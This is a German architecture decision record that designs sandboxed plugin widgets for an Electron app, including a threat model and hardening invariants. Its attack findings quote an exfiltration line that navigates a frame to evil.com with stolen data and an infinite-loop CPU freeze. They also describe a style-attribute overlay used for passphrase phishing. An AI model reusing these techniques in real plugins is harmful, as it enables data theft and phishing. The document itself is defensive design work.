# ADR — Plugin Renderer-Widgets (A1, Renderer-Spike)

> Status: **Entwurf zur Review** (ADR-first, kein Code). Branch `feat/plugin-renderer-widgets`.
> Folgt auf **A1 Main-only** (Runtime-Loader, gemergt in #28). Anker: **ein Sidebar-/Dashboard-Widget**.
> Gegründet auf Codebase-Research + adversariale Sicherheitsprüfung (6 Angriffsflächen). Die
> „Harten Invarianten" (§6) sind die als bindend übernommenen Must-Fixes aus der Angriffsphase.

## 1. Ziel & Anker

Externe (disk-installierte, signaturgeprüfte) Plugins sollen ein **Widget** in Dashboard/Sidebar
beitragen können. Das Widget ist klein, sichtbar und zwingt genau die neue Vertrauensgrenze:
**Renderer-Code eines externen Plugins ist UNTRUSTED.** Das ist deutlich schärfer als Main-only,
wo Signatur + Autorvertrauen genügten — hier läuft fremder Code im Renderer-Kontext.

Settings sind bereits über `settingsSchema` weitgehend deklarativ lösbar (testen die Grenze kaum);
ein eigener Tab/Custom-View wäre für den ersten Spike zu groß. Ein Widget ist der richtige Anker.

## 2. Bindende Leitplanken (User — NICHT verhandelbar, NICHT „Empfehlung")

1. **Einfache Widgets deklarativ** (Host rendert native React aus Daten/Schema; **kein Plugin-JS im Host**).
2. **Individuelle Widgets in einem sandboxed iframe** (bzw. session-partitionierter WebContents, s. §5.3).
3. **Kein Zugriff** auf `electronAPI`, Host-DOM oder Host-CSS.
4. **Kommunikation ausschließlich über schema-validiertes `postMessage`.**
5. **Host kontrolliert** Größe, CSP, erlaubte Aktionen und Unload.
6. **`plugin:invoke` ist NICHT selbst die Widget-Allowlist:** der Host fixiert die `pluginId` SELBST
   und erlaubt pro Widget ausschließlich die im Manifest deklarierten Action-IDs. Weder Plugin-ID
   noch Zielaktion dürfen frei aus der Nachricht stammen.
7. **`event.origin` ist bei `sandbox` ohne `allow-same-origin` typischerweise `null`** → Authentisierung
   über exakten `event.source === iframe.contentWindow` + instanzgebundenen **Nonce** + strikte
   Schemas, NICHT über Origin.
8. **Sandbox-Ausgangspunkt nur `sandbox="allow-scripts"`** — keine Popups, Navigation, Downloads,
   Forms, Storage.
9. **Der bestehende React-Slot-Pfad bleibt ausdrücklich `bundled-only`.**

## 3. Ausgangsbefund (Codebase-Research, belegt)

- **Der bestehende Renderer-Slot-Pfad ist `bundled-only` und Volltrauen.** `RendererPluginRegistry` +
  `discoverRendererPlugins()` (`renderer/plugins/registry.ts:50`) nutzt `import.meta.glob('../../plugins/*/renderer/index.tsx', {eager:true})` — **Build-Zeit**-Erkennung NUR in-Repo-Quelle. `PluginSlot`
  (`renderer/plugins/slots.tsx`) mountet die Komponente via `React.lazy` **direkt in den Host-React-Baum**
  → gleiches DOM/CSS/`window.electronAPI`. Ein disk-`renderer.js` aus `userData` wird hiervon NIE
  gesehen; externe Plugins über diesen Pfag zu mounten = sofortiger Vollausbruch. **Verboten.**
- **Manifest-Fläche existiert, ist ungenutzt:** `ui.{dashboardWidget,sidebarPanel}: SlotDecl{slot, fromAction?}`,
  `entrypoints.renderer`, `settingsSchema` (`packages/plugin-api/src/manifest.ts`) — deklariert, ajv-validiert,
  **null Renderer-Konsumenten**. Das ist der natürliche datengetriebene Mount-Deskriptor.
- **A1 lehnt Renderer-only heute ab:** `discover.ts:68` / `install.ts:88` werfen
  `entrypoint-unsupported`. Ein reines Widget-Plugin ist heute nicht installierbar → neue
  Discovery-/Verify-Naht nötig.
- **Host-Isolation heute korrekt, aber teils per Default:** `contextIsolation:true`, `nodeIntegration:false`,
  `webSecurity` nicht überschrieben (= true), preload→`electronAPI` nur im Top-Frame
  (`index.ts:807-811`, `preload.ts:86`). `isTrustedSender` (`transport.ts:18-28`) lehnt Subframes ab
  (`frame !== wc.mainFrame`) → ein `<iframe>` erreicht `plugin:invoke` NIE direkt; die Host-vermittelte
  postMessage-Brücke ist damit **erzwungen, nicht optional**.
- **`registry.invoke` gated per-Action/Manifest, NICHT per-aufrufendem-Widget** (`main/plugins/registry.ts`):
  Aktivierung + Capability-Subset + In/Out-Schema + `hardLockModule`. Das fehlende **per-Widget-Scoping**
  ist die neue Trust-Engstelle (§6.B).
- **Fallen, die der ADR explizit bannen muss:** `setWindowOpenHandler` (`index.ts:830`) ist **fail-open**
  (`{action:'allow'}` für nicht-http) → ein Popup-Kindfenster erbt preload+`electronAPI`. `sanitizeHtml`
  (`utils/sanitize.ts`) ist der **permissive Vault-Sanitizer** (erlaubt `style`/`class`/`id`/`iframe`/
  `img`/`svg`/`input`) — NICHT für untrusted Bytes. Das PDF-iframe (`MarkdownEditor.tsx:3764`) ist
  **un-sandboxed + blob:** (same-origin) → darf `parent.electronAPI` erreichen. Es gibt **keinen**
  `webRequest`-Egress-Filter, **kein** `will-frame-navigate`, **keinen** state-change-Push, und die
  Slot-Registry ist **statisch** (kein remove/clear).

## 4. Tier 1 — DEKLARATIV (Default, ship-first, **null Script-Surface**)

Der Anker-Fall. Kein iframe, kein Plugin-JS im Renderer, keine CSP-/Origin-Frage.

- Manifest: `ui.dashboardWidget = { slot, fromAction, view }` — `view` = reines, ajv-validiertes
  Daten-Schema (Manifest bleibt code/JSX-frei).
- **Datenfluss:** Host ruft beim Mount/Refresh `registry.invoke(pluginId, fromAction, {})` (bereits
  gegated; **UI ist KEINE Capability** — das Widget zieht Daten über die deklarierte Action), bekommt
  output-schema-validierte Daten und rendert sie über ein **festes, host-eigenes, allowlisted Vokabular**
  nativer React-Primitive: `{kind:'stats'|'list'|'keyValue'|'progress'|'badge', …}` (inkl. 🔴🟢🔵-Status-Dot
  über `utils/noteKind.ts`).
- **Plugin-Strings sind ausschließlich React-TEXT-Nodes (auto-escaped).**
- Mountpoint = die bestehenden hardcodeten Slot-IDs (`dashboard.widget.<id>`, `sidebar.panel.<id>`),
  host-gerendert, **nie** `React.lazy(fremder Code)`; gewrappt in `SlotErrorBoundary`+`Suspense`.

> **Sicherheits-Korrektur ggü. dem ersten Entwurf (Attack: HIGH, DOM/CSS-Overlay-Phishing):**
> Die ursprüngliche Idee „rich markup via `sanitizeHtml`" ist **gestrichen**. `sanitizeHtml`/
> `sanitizeEmailHtml` erlauben das `style`-Attribut → ein output-schema-valider String
> (`{summary:string}`) könnte per `position:fixed;inset:0;z-index:max` ein **Full-Viewport-Overlay**
> über die gesamte Host-Chrome legen (z.B. Sync-Passphrase-Phishing), gerendert mit Host-Vertrauen.
> Das umgeht die ganze iframe-Sandbox-Architektur.
> **Invariante I-D1:** Tier 1 = **NULL Roh-HTML**, **kein `dangerouslySetInnerHTML`** im Declarative-Host,
> kein `sanitizeHtml`/`sanitizeEmailHtml`. Nur das feste Primitiv-Vokabular, Strings als Text-Nodes.
> **I-D2:** View-/Output-Schemas `additionalProperties:false`; **keine** Felder `style`/`className`/
> `id`/`html`/`url`/`href`/`src` — Primitive tragen nur Daten, nie Präsentation. Host besitzt 100 % des
> Stylings. **I-D3:** Declarative-Container mit `contain: layout paint style` + `overflow:hidden`
> (fängt jeden residualen positionierten Ausbruch). Falls Rich-Text je unvermeidbar wird: NEUER
> dedizierter `sanitizePluginWidgetHtml` (style/class/id/iframe/img/svg/input/form verboten; nur
> Inline-Textformatierung) — niemals die Vault-Sanitizer.

Tier 1 deckt ~90 % der Widgets, ist trivially deletion-test-konform (kein Beitrag → leerer Slot) und
hat **keine iframe-Angriffsfläche**. **Ship-first.**

## 5. Tier 2 — SANDBOXED CUSTOM-WIDGET (gated, **zweiter** Increment, nicht im ersten Build)

Nur wenn Tier 1 nicht reicht (eigenes Layout/Interaktivität/Canvas).

### 5.1 Laden — privilegiertes `mgxplugin://`-Protokoll
`protocol.registerSchemesAsPrivileged([{scheme:'mgxplugin', privileges:{standard:true, secure:true,
supportFetchAPI:true, corsEnabled:false}}])` VOR `app.whenReady()`; `protocol.handle('mgxplugin', …)`.
Gewählt über blob:/data:/srcdoc, weil NUR eine echte Response einen **host-gesetzten CSP-Header**
tragen kann (blob/srcdoc: headerlos bzw. opaque-`'self'`-Falle), multi-file-Assets erlaubt und per-Serve
Integrity prüfbar ist. Pro Request: `assertSafeStoreVersionDir` (Symlink/Traversal/Containment) → Datei
muss in `integrity.json` gelistet sein → Antwort mit striktem CSP-Header. Begründung der Schema-Wahl =
CSP-Träger/Asset-Ergonomie, **nicht** Isolation (die kommt vom Sandbox-Attribut).

> **Sicherheits-Korrektur (Attack: MEDIUM, „Laden nicht-verifizierter Bytes"):** Re-Hash gegen die
> **On-Disk**-`integrity.json` ist nur Selbst-Konsistenz, KEINE Authentizität (Ed25519 läuft nur in
> `verifyInstalledDir` bei Aktivierung). Ein Angreifer mit `userData`-Schreibrecht ersetzt `widget.js`
> + passt die On-Disk-`integrity.json` an → Match.
> **Invariante I-L1:** Erwarteter Hash kommt AUSSCHLIESSLICH aus einer **In-Memory-Map**, befüllt von
> `verifyInstalledDir` (inkl. Ed25519) bei Aktivierung — NIE aus frischem On-Disk-Read.
> **I-L2:** Der Handler gated auf den **In-Memory-Registry-Laufzeitzustand** (blockedIds + Re-Verify +
> Aktivierung bereits angewandt), NICHT auf ein frisches Lesen der untrusted `active.json`.
> **I-L3:** Jede `200` trägt den CSP-Header aus EINEM Chokepoint; jeder Edge → `403/404` ohne Body
> (header-loser Erfolg = keine Frame-CSP). **I-L4:** `script-src` host-scopen auf `mgxplugin://<id>`
> (nicht schemaweit) — sonst lädt Plugin A den verifizierten Code von Plugin B (Asset-Confusion).

### 5.2 Sandbox + CSP
- **Sandbox = exakt `allow-scripts`**, sonst nichts. **Niemals** `allow-same-origin` (→ opaque
  `'null'`-Origin → `window.parent.electronAPI` wirft SecurityError; `allow-same-origin` **+**
  `allow-scripts` erlaubte dem Frame, sein eigenes Sandbox-Attribut im Parent-DOM zu entfernen =
  Vollausbruch). Kein `allow-popups`/`-top-navigation`/`-forms`/`-downloads`/`-modals`.
- **Frame-CSP (Response-Header, host-gesetzt, vom Autor nicht abschwächbar):** `default-src 'none';
  script-src mgxplugin://<id>; style-src mgxplugin://<id> 'unsafe-inline'; img-src mgxplugin://<id> data:;
  font-src mgxplugin://<id>; connect-src 'none'; frame-src 'none'; child-src 'none'; object-src 'none';
  base-uri 'none'; form-action 'none'; frame-ancestors <exakter Host-Origin>`. `connect-src 'none'` =
  kein fetch/XHR/WS/Beacon. **Host-Meta-CSP** (`index.html:6`) bekommt `mgxplugin:` nur in `frame-src`
  (welche Frames einbettbar) — im Binary, nicht runtime-mutierbar.

### 5.3 **Offene Kernentscheidung — Navigations-Egress + CPU-Isolation** ⚠️

> **Attack: HIGH (Navigation-Exfil) + HIGH (CPU-DoS).** Zwei strukturelle Lücken eines *shared-session*
> `<iframe sandbox>`, die CSP/Sandbox **nicht** schließen:
> - **Navigations-Exfil:** `location.href='https://evil.com/?d='+btoa(stolen)` ist Selbst-Navigation des
>   Frames — `connect-src` ist eine Fetch-, keine Navigations-Direktive; Chromiums `navigate-to` ist nicht
>   ausgeliefert; `will-navigate` deckt nur den Main-Frame. Ein Einzeiler leakt beliebige Broker-Daten
>   (datenschutzkritisch bei „verlässt nie deinen Rechner").
> - **CPU-DoS:** `for(;;){}` friert den **geteilten** Renderer-Thread; ein Renderer-`setTimeout`-Watchdog
>   feuert dann nie. Site-Isolation/Prozess-Affinität ist heute NICHT gesetzt.
>
> **Das ist ein DETAIL der Durchsetzung, KEINE Änderung der Sicherheitsrichtung** (weiterhin sandboxed,
> kein electronAPI/DOM/CSS, postMessage-only, host-kontrolliert). Zwei Optionen — **Entscheidung vor
> Tier-2-Bau, Review-Punkt für den User:**
>
> - **(A) `<iframe sandbox>` + Main-Egress-Filter.** DOM-natives Element (leichte Layout-Integration in
>   den scrollenden Dashboard/Sidebar). Erfordert: `will-frame-navigate` → `preventDefault()` für jedes
>   Ziel ≠ `mgxplugin://`; `did-frame-navigate` → Force-Unload; ein `session.webRequest.onBeforeRequest`,
>   der Plugin-Frame-Requests am `mgxplugin://`-Initiator erkennt und cross-scheme `cancel:true`. **Haken:**
>   der iframe erbt die **Host-Session** → den Egress-Filter sauber NUR auf Plugin-Frames zu scopen ist
>   fragil; CPU-DoS bleibt (gleicher Thread) → Main-getriebene Hang-Detection + Force-Kill nötig.
> - **(B) Session-partitionierter `WebContentsView`.** Eigene Session-Partition → **sauberer Egress-Filter**
>   (`webRequest.onBeforeRequest`: `cancel` für alles ≠ `mgxplugin:` — fängt Navigation, Subresource,
>   Beacon, Prefetch, WebRTC unter allen CSP-Lücken); eigener Renderer-Prozess → **CPU-Isolation** +
>   Main-`render-process-gone`-Detection. **Haken:** nativer Overlay statt DOM-Element → Positionierung/
>   Scroll/z-index mit der React-Layout-Schicht ist Mehraufwand.
>
> **Empfehlung:** **(B)** — die Egress-/Prozess-Grenze ist die einzige *strukturelle* (CSP-unabhängige)
> Verteidigung gegen Navigations-Exfil und CPU-DoS und passt zu „Host kontrolliert Navigation + Unload".
> (A) ist nur vertretbar mit lückenlosem Main-Egress-Filter + akzeptiertem CPU-Risiko.

### 5.4 Broker (postMessage) — Autorisierung in den **Main-Prozess**
- **Kanal:** `MessageChannel` point-to-point (NICHT der globale window-`message`-Bus — der mischte mit
  den PDF-blob-iframes). Handshake: bei iframe-`load` transferiert der Top-Frame **genau einmal** `port2`
  via `postMessage({type:'mgx:init', nonce, …}, '*', [port2])` (`'*'` nötig, da Ziel-Origin `'null'` nicht
  adressierbar — trägt nur den Port + Nonce, nie Payload). **Identität:** Init nur akzeptieren bei
  `event.source === iframe.contentWindow` (+ Nonce-Echo); danach garantiert die Port-Identität die
  Herkunft. Zweites Init vom selben Frame ablehnen.
- **Envelope (ajv, `additionalProperties:false`):** inbound `{type:'invoke', requestId, actionId, payload}`
  (+ `resize`/`ready`/`log`); outbound `{type:'result', requestId, ok, data?|error?}`. Das Envelope hat
  **kein** `pluginId`/`method`/`capability`-Feld.

> **Sicherheits-Korrektur (Attack: HIGH, „Broker zu nicht-deklarierter Action"):** `registry.invoke`
> gated nur per-Manifest — ein Widget könnte sonst **jede** deklarierte Action seines Plugins auslösen
> (z.B. `saveCredentials`/`runLLM`), nicht nur seine `fromAction`. Und `preload.pluginInvoke` nimmt
> **beliebige** `pluginId`/`actionId` → jede Top-Frame-XSS (z.B. via die in `sanitizeHtml` erlaubte
> `<iframe>`-Injektion in gerendertem Markdown) umginge einen reinen Renderer-Broker.
> **Invariante I-B1:** Per-Widget-Scoping in den **Main-Prozess** ziehen — pro Mount ein **scoped
> Invoke-Token / scoped IPC-Kanal**, der NUR die signierte `ui.*.fromAction` (+ optionale explizite
> Manifest-Allowlist) zulässt, abgeleitet aus dem Manifest, exakt case-sensitiv, **nie aus dem Frame**.
> **I-B2:** `pluginId` wird beim Mount über die Port→Id-Map gebunden, NIE aus einer Nachricht gelesen →
> Cross-Plugin-Calls strukturell unmöglich. **I-B3:** Host-seitiges **Rate-/In-Flight-/Payload-Limit
> VOR Deserialisierung/ajv**, alle Message-Typen (nicht nur `invoke`) — `registry.invoke` hat keinen
> Throttle; Frame-Kill bei Überschreitung. **I-B4:** `fromAction`-Output braucht ein **restriktives
> outputSchema ohne Secret/PII-Felder** (registry.invoke validiert nur die Form, strippt nichts); der
> Broker spiegelt nur `{ok,error}`, nie rohe Exceptions. **I-B5:** Lifecycle-IPC
> (`plugin:install/uninstall/setEnabled`) wird NIE gebrückt — kein Self-Activate/-Install.

### 5.5 Anti-Clickjacking
- **Nicht-fälschbare Host-Demarkation:** jede Widget-Fläche bekommt einen **vom Host (außerhalb des
  iframe)** gezeichneten Rahmen/Badge „Plugin: <id>". `themeTokens` an den Frame (perfektes Chrome-
  Spoofing) entfällt oder wird durch die Demarkation flankiert. **Regel:** kein host-privilegierter
  Prompt (Sync-Passphrase, Senden-Bestätigung, Credential-Eingabe) je **in/neben** einer Plugin-Region.

## 6. Harte Invarianten (bindend, mit Tests/Guards) — Übersicht

**A. Host-/Electron-Härtung (erzwingen, nicht auf Defaults verlassen):**
- I-A1 `setWindowOpenHandler` **fail-closed**: non-http(s)/Plugin-Frame-Herkunft → `{action:'deny'}`
  (heute fail-open → Popup-Kindfenster erbt preload+electronAPI). **Höchste Priorität.**
- I-A2 `nodeIntegrationInSubFrames:false` + `webviewTag:false` **explizit pinnen** (+ Test) — heute nur
  per Default; ein Copy-Paste, das das kippt, gäbe jedem Plugin-Frame sofort den preload.
- I-A3 Einziger erlaubter iframe-Konstruktionsort: ein gehärteter `<ExternalWidgetHost>` mit dem
  Sandbox-String als **nicht-überschreibbarer Konstante** + Test, der das gerenderte Attribut asserted.
- I-A4 `isTrustedSender` **fail-closed**: `event.senderFrame === wc.mainFrame` verlangen, NULL ablehnen
  (heute lässt `frame && …` NULL durch).
- I-A5 `webSecurity:true` als Invariante für den Host-webContents (nie lockern) — Guard + Doku.
- I-A6 PDF-blob-iframe-Precedent (`MarkdownEditor.tsx:3764`) für den Plugin-Tier **verboten** —
  un-sandboxed/blob: erreicht `parent.electronAPI`.

**B. Broker/Autorisierung:** I-B1…I-B5 (§5.4). **D. Deklarativ:** I-D1…I-D3 (§4). **L. Loader:**
I-L1…I-L4 (§5.1). **N. Navigation/Egress:** §5.3 (A)/(B) + I-A1.

## 7. Lifecycle / Unload (neue Infra — für **beide** Tiers nötig)

> **Attack: HIGH (Zombie nach Uninstall).** Heute fehlt die Teardown-Infrastruktur: nur `plugin:list`-
> **Pull** (kein state-change-Push), und die Slot-Registry ist **statisch** (`import.meta.glob`, kein
> remove/clear) → ein gemountetes Widget bleibt nach Disable/Uninstall als Zombie stehen.

- **N1** Neue **Renderer-Entrypoint-Discovery+Verify-Naht** PARALLEL zum Main-Loader (`entrypoints.renderer`/
  `styles` von `verifyInstalledDir` re-hashed) — NIE über `import.meta.glob`/`React.lazy`. A1 lehnt
  Renderer-only heute ab (`discover.ts:68`/`install.ts:88`) → diese Naht hebt das gezielt auf.
- **N2** **State-change-Push Main→Renderer** (`webContents.send`) statt nur Pull; der Renderer-Host
  mountet das Widget nur, solange das Plugin `active`+`invokable` ist.
- **N3** **Dynamische Slot-Registry** mit `remove`/`clear` (heute statisch).
- **N4** **Teardown-Reihenfolge:** `port.close()` VOR `iframe.remove()`/`about:blank`; pending Invokes mit
  `widget-unloaded` rejecten; Port→Id-Map-Eintrag löschen; Slot-Beitrag entfernen (→ leerer Slot). Main
  setzt bei deactivate/uninstall bereits `p.actions = new Map()` → nachlaufende Invokes landen hart auf
  `{ok:false}`. **Main-getriebener Force-Kill** (about:blank vom Main via webContents / Prozess-Kill bei
  Option B) als Fallback, falls der Renderer-Teardown (CPU-Freeze) nicht durchläuft.
- **N5** `isPluginInvokable` verlangt heute `installation==='bundled'` (`state.ts`) → für externe Installs
  erweitern, OHNE das Invoke-Gate zur Backdoor zu weiten.
- **N6** **Deletion-Test deckt RUNTIME-Disable/Uninstall** ab (nicht nur Build-Zeit-Abwesenheit).

## 8. Scope / Staging

- **Spike-1 (dieser PR-Strang):** **Tier 1 deklarativ** + Renderer-Entrypoint-Discovery-Naht (N1) +
  Lifecycle-Push + dynamische Slots (N2/N3/N4/N6). **KEIN iframe, kein neues Protokoll.** Beweist
  Isolation (kein Plugin-JS), Datenfluss über gegatete Action, sauberes Unload, Deletion-Test.
- **Spike-2 (gated, separater Increment):** **Tier 2 sandboxed Widget** — erst nach Entscheidung §5.3
  (A vs B) und Umsetzung von I-A*/I-B*/I-L*. Eigene Review-Runde.
- **Außerhalb:** eigene Tabs/Custom-Views/Navigation, Renderer-Plugin-Marktplatz, Multi-Widget-Layout.

## 9. Akzeptanzkriterien

- Tier 1: ein externes Plugin mit `ui.dashboardWidget={slot,fromAction,view}` rendert ein Widget aus dem
  Primitiv-Vokabular; **kein** `dangerouslySetInnerHTML` im Pfad (Test/Lint-Guard); View-Schema
  `additionalProperties:false` ohne Präsentationsfelder.
- Daten kommen ausschließlich über `registry.invoke(pluginId, fromAction)` (gegated); UI ist keine Capability.
- Disable/Uninstall **zur Laufzeit** → Slot leer, kein Zombie (Deletion-Test, N6).
- Host-Härtung I-A1…I-A6 als Code-Guards + Tests (auch ohne Tier-2-Bau sinnvoll: schließen latente Löcher).
- `npm run typecheck` + `npm run test` + `npm run build` grün; gebündelte Renderer-Plugins unverändert.
- (Tier 2, später) Negativtests: Frame erreicht `electronAPI` nicht; Broker lehnt nicht-`fromAction` ab;
  Selbst-Navigation/Egress geblockt; CPU-Freeze vom Main erkannt+gekillt.

## 10. Offene Entscheidungen (für die Review)

1. **§5.3 — (A) `<iframe sandbox>` + Main-Egress-Filter vs. (B) session-partitionierter `WebContentsView`.**
   Empfehlung (B). Betrifft Navigations-Exfil + CPU-Isolation; berührt die „sandboxed iframe"-Formulierung
   der Leitplanke (Detail der Durchsetzung, nicht der Richtung).
2. **Tier-1-only als Spike-1 ausliefern** und Tier 2 als gated Folge-Increment? (Empfehlung: ja.)
3. `view`-Schema-Vokabular: minimaler Satz (stats/list/keyValue/progress/badge) für v1 ausreichend?
4. Host-Demarkation „Plugin: <id>" verpflichtend auch für **Tier 1** (Konsistenz), oder erst Tier 2?

## 11. Follow-ups (nicht in diesem Spike)

- F-R1 `sanitizePluginWidgetHtml` (falls Rich-Text je nötig). F-R2 Egress-Filter-Generalisierung.
- F-R3 Multi-Widget-Layout/Resize-Policy. F-R4 Tier-2-Prozess-Modell (WebContentsView-Lifecycle, OOPIF).
